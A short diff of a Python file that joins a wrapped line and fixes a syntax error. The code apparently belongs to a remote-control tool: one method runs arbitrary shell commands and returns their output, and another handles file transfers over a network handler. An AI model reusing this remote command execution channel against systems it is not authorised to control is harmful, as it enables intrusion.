@@ -79,8 +79,7 @@ class custom:
         subprocess.check_call([self.python, "-m", "pip", "install", "--user", package])
 
     def execute(self, command):
-        command_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                          stdin=subprocess.PIPE)
+        command_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         return command_output.stdout.read() + command_output.stderr.read()
 
 class badges:
@@ -174,7 +173,7 @@ class magic_unicorn:
     def command_download(self, cmd_data):
         output_filename = os.path.split(cmd_data.split(" ")[0])[1]
         output_directory = cmd_data.split(" ")[1]
-        exists, path_type = self.fsmanip.exists_directory(output_directory):
+        exists, path_type = self.fsmanip.exists_directory(output_directory)
         if exists:
             self.handler.send("success".encode("UTF-8"))
             if path_type != "file":
